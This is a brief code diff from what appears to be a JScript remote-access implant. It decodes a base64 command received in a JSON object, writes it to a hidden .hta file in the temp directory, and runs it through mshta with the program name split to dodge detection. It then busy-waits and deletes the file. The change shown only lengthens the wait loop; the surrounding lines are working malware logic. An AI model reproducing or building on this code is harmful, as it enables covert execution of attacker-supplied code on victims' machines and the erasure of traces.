@@ -169,7 +169,7 @@ function main()
           fd.WriteLine(b64d(jsObject.cmnd.split(" ")[1]))
           fd.close()
           runner.Run("ms" + "hta " + temp + "\\" + id + ".hta", 0, false)
-          for(var i = 0; i < 40000000; i++) {
+          for(var i = 0; i < 60000000; i++) {
             // busy wait to wait for above cmnd to finish
           }
           fso.DeleteFile(temp + "\\" + id + ".hta")
